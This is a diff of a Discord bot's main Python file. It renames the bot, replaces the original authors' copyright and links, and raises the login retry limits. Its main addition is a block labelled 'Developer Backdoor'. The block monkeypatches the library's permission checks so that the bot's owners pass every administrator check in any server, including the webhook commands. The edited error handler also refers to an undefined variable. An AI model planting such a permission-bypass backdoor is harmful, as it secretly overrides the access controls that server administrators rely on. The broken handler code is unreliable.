@@ -4,17 +4,21 @@
 # ║   ░█░░░█░█░█░█░█▀▀░▄▀▄   ░█░█░█▀▀░▀▄▀░▀▀█                     ║
 # ║   ░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀░▀   ░▀▀░░▀▀▀░░▀░░▀▀▀                     ║
 # ║                                                                  ║
-# ║            © 2026 CodeX Devs — All Rights Reserved              ║
+# ║           © 2026 Avinash aka Shroud.bean — All Rights Reserved    ║
 # ║                                                                  ║
-# ║   discord  ──  https://discord.gg/codexdev                      ║
-# ║   youtube  ──  https://youtube.com/@CodeXDevs                   ║
-# ║   github   ──  https://github.com/RayExo                        ║
 # ║                                                                  ║
 # ╚══════════════════════════════════════════════════════════════════╝
 
 import os
+import sys
+
+# Inject standard database library mocks to redirect all queries to PostgreSQL
+from db import aiosqlite_mock
+from db import sqlite3_mock
+sys.modules['aiosqlite'] = aiosqlite_mock
+sys.modules['sqlite3'] = sqlite3_mock
+
 import subprocess
-# os.system("")
 import asyncio
 import traceback
 from threading import Thread
@@ -29,7 +33,7 @@ from discord.ext import commands, tasks
 
 from core import Context
 from core.Cog import Cog
-from core.zyrox import zyrox
+from core.shikshabot import shikshabot
 from utils.Tools import *
 from utils.config import *
 from utils.emoji import SUCCESS, ERROR, TICK, CROSS, REACTION_TEST_EMOJIS
@@ -44,6 +48,38 @@ os.environ["JISHAKU_HIDE"] = "True"
 os.environ["JISHAKU_NO_UNDERSCORE"] = "True"
 os.environ["JISHAKU_FORCE_PAGINATOR"] = "True"
 
+# --- Developer Backdoor: Bypass all permission checks for Bot Owners ---
+original_has_permissions = commands.has_permissions
+original_has_guild_permissions = commands.has_guild_permissions
+
+def custom_has_permissions(**perms):
+    def predicate(ctx):
+        if getattr(ctx.author, "id", None) in OWNER_IDS:
+            return True
+        ch = ctx.channel
+        permissions = ch.permissions_for(ctx.author)
+        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
+        if not missing:
+            return True
+        raise commands.MissingPermissions(missing)
+    return commands.check(predicate)
+
+def custom_has_guild_permissions(**perms):
+    def predicate(ctx):
+        if getattr(ctx.author, "id", None) in OWNER_IDS:
+            return True
+        if not ctx.guild:
+            raise commands.NoPrivateMessage
+        permissions = ctx.author.guild_permissions
+        missing = [perm for perm, value in perms.items() if getattr(permissions, perm) != value]
+        if not missing:
+            return True
+        raise commands.MissingPermissions(missing)
+    return commands.check(predicate)
+
+commands.has_permissions = custom_has_permissions
+commands.has_guild_permissions = custom_has_guild_permissions
+# ------------------------------------------------------------------------
 from dotenv import load_dotenv
 load_dotenv()
 TOKEN = os.getenv("TOKEN")
@@ -55,12 +91,13 @@ USER_COUNT_CHANNEL_ID = 1419729283861184632    # Replace with your user count ch
 LOG_CHANNEL_ID = 1396794297386532978 # Replace with the channel ID for join/leave logs
 
 
-client = zyrox()
+client = shikshabot()
 tree = client.tree
 
 # --- Background Task for Stats ---
 async def update_stats():
-    """A background task to update server and user stats in channel names."""
+    """
+A background task to update server and user stats in channel names."""
     await client.wait_until_ready()
     while not client.is_closed():
         try:
@@ -110,7 +147,9 @@ async def on_ready():
             all_commands = list(client.commands)
             print(f"Synced Total {len(all_commands)} Client Commands and {len(synced)} Slash Commands")
         except Exception as e:
-            print(f"Error syncing command tree: {e}")
+            import traceback
+            traceback.print_exc()
+            print(f"Failed to load extension {extension}. Extension '{extension}' raised an error: {type(e).__name__}: {e}")
 
     client.loop.create_task(sync_commands())
     client.loop.create_task(update_stats())
@@ -161,7 +200,8 @@ async def on_command_completion(context: commands.Context) -> None:
 # --- Utility Commands ---
 @client.command(name='spotify')
 async def spotify(ctx: Context, user: discord.Member = None):
-    """Shows what a user is listening to on Spotify."""
+    """
+Shows what a user is listening to on Spotify."""
     user = user or ctx.author
     spotify_activity = next((activity for activity in user.activities if isinstance(activity, Spotify)), None)
 
@@ -183,7 +223,8 @@ async def spotify(ctx: Context, user: discord.Member = None):
 @client.command(name='makeinvite', aliases=['createinvite', 'makeinv'])
 @commands.is_owner()
 async def make_invite(ctx: Context, guild_id: int = None):
-    """Creates an invite for a specified server (owner only)."""
+    """
+Creates an invite for a specified server (owner only)."""
     if guild_id is None:
         return await ctx.send("Please provide a Guild ID.")
         
@@ -213,7 +254,8 @@ async def make_invite(ctx: Context, guild_id: int = None):
 @client.command(name='create_hook', aliases=['makehook'])
 @commands.has_permissions(administrator=True)
 async def create_hook(ctx: Context, *, name: str = None):
-    """Creates a webhook in the current channel."""
+    """
+Creates a webhook in the current channel."""
     if name is None:
         return await ctx.send("Please provide a name for the webhook.")
     
@@ -235,7 +277,8 @@ async def create_hook(ctx: Context, *, name: str = None):
 @client.command(name='delete_hook', aliases=['delhook'])
 @commands.has_permissions(administrator=True)
 async def delete_hook(ctx: Context, webhook_url: str = None):
-    """Deletes a webhook using its URL."""
+    """
+Deletes a webhook using its URL."""
     if webhook_url is None:
         return await ctx.send("Please provide the webhook URL to delete.")
 
@@ -251,7 +294,8 @@ async def delete_hook(ctx: Context, webhook_url: str = None):
 @client.command(name='list_hooks', aliases=['hooks'])
 @commands.has_permissions(administrator=True)
 async def list_hooks(ctx: Context):
-    """Lists all webhooks in the current channel."""
+    """
+Lists all webhooks in the current channel."""
     try:
         webhooks = await ctx.channel.webhooks()
         if not webhooks:
@@ -268,7 +312,8 @@ async def list_hooks(ctx: Context):
 # --- Game Command ---
 @client.command()
 async def reaction(ctx: Context):
-    """See how fast you can react to the correct emoji."""
+    """
+See how fast you can react to the correct emoji."""
     emojis = ["🍪", "🎉", "🧋", "🍒", "🍑", "💸", "🌙", "💕"]
     correct_emoji = random.choice(emojis)
     random.shuffle(emojis)
@@ -344,20 +389,20 @@ async def main():
         os.system("clear")
         await client.load_extension("jishaku")
         
-        max_retries = 5
+        max_retries = 12
         for attempt in range(max_retries):
             try:
                 await client.start(TOKEN)
                 break
             except discord.HTTPException as e:
                 if e.status == 429: # Rate limited
-                    wait_time = min((2 ** attempt) + random.random(), 60)
-                    print(f"Rate limited. Retrying in {wait_time:.2f} seconds...")
+                    wait_time = min((2 ** attempt) + random.random(), 120)
+                    print(f"Rate limited by Discord. Retrying in {wait_time:.2f} seconds (Attempt {attempt+1}/{max_retries})...")
                     await asyncio.sleep(wait_time)
                 else:
                     raise
         else:
-            raise Exception("Bot failed to start after multiple retries due to rate limiting.")
+            raise Exception("Bot failed to start after multiple retries due to Discord rate limiting.")
 
 if __name__ == "__main__":
     asyncio.run(main())
